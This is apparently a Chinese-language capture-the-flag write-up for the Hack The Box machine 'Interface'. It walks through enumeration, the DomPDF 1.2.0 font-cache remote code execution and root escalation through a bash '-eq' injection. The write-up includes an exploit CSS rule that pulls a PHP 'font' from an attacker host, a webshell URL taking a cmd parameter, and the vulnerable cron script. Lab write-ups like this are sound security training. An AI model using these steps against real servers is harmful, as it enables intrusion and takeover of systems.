# Interface

Interface 是一种中等难度的 Linux 机器，具有“DomPDF”API 端点，该端点通过将“CSS”注入处理后的数据而容易受到远程命令执行的影响。“DomPDF”可以被诱骗在其字体缓存中存储带有“PHP”文件扩展名的恶意字体，然后可以通过从其公开的目录访问它来执行它。权限提升涉及在 bash 脚本中滥用带引号的表达式注入。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/123fab44-1841-84ca-b24a-0d0884bf0cbd.png)

### Web枚举

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1f4e2eea-7dd7-cc47-df30-73af62fec2fe.png)

在响应头中，能看到它的域名

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ac4fff80-caa5-3a78-91bf-71e5b27b4e50.png)

ffuf

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/52c4a090-c32c-cffa-d369-69f0558a2830.png)

/api端点

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/617aaa68-afb9-4d8a-5f69-c642add9b329.png)

这里html转成了pdf

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/a074845a-3622-7b1f-5bc5-6af108003acd.png)

## Foothold

在pdf中纰漏了dompdf 1.2.0

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1dfbaa0a-3254-e310-7576-41ee8f52a4af.png)

在谷歌中能够找到该版本存在问题，并且github上还有exp

https://github.com/positive-security/dompdf-rce

从exp的exploit.css也就不难看出大概是怎么回事了

```css
@font-face {
    font-family:'exploitfont';
    src:url('http://10.10.14.18:9001/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
```

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5bf749bc-1733-f04d-941d-14cf6257c54b.png)

改一下exploit_font.php

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f15c062e-aefd-eaf7-a9fd-9195e1963e3d.png)

打exp,目标将会缓存我们的字体文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/58b192aa-4320-5be2-d0dd-d46712a42803.png)

获取字符串md5，用于缓存文件名的组成

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6af86b5d-0972-be8a-0f7b-43774eb62792.png)

9001还是用python3开http server才能正常

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2b0953da-f712-0fd2-b487-5ccaa297969d.png)

访问文件

	http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_b82f3437a14b588f9bc8cdb2cd1baaf2.php?cmd=id

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bd1c7a85-cc12-daa1-220b-13827318454e.png)

常规python3 reverse shell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e066131d-c871-d8cb-591e-24c6963d7aea.png)

## 本地权限提升

传个pspy过去发现有shell脚本在跑

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f8eb4eed-6ec8-8f99-a23f-55d0b66b0f0a.png)

```bash
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

使用exiftool读取Producer信息，然后判断它是否等于dompdf

[这篇文章](https://dev.to/greymd/eq-can-be-critically-vulnerable-338m)告诉我们这个shell代码可能会导致插入恶意shell命令并且被执行

	if [[ "$meta_producer" -eq "dompdf" ]];

首先写一个shellcode或者其他的命令文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/43e0ccbe-2414-9872-0069-cd7be05ade43.png)

通过exiftool插入payload，然后将文件移动到/tmp

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9705b77f-83ba-54f2-fb86-947934ef2471.png)

等待计划任务执行，我们将能得到它

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2731f859-bc24-a0d8-6e44-92200b4f2dc6.png)
